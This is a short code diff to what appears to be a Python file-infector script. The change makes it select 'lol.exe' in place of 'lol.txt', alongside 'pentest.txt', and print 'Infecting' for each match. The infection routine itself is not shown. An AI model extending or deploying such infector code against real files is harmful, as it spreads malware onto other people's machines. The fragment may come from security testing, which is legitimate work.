@@ -47,8 +47,8 @@ def main():
     files_in_directory = os.listdir(".")
 
     for filename in files_in_directory:
-        # Target only the pentest.txt file and lol.txt
-        if filename == "pentest.txt" or filename == "lol.txt":  # Ensure the name matches
+        # Target only the pentest.txt file and lol.exe
+        if filename == "pentest.txt" or filename == "lol.exe":  # Ensure the name matches
             print(f"Infecting: {filename}")
 
             try:
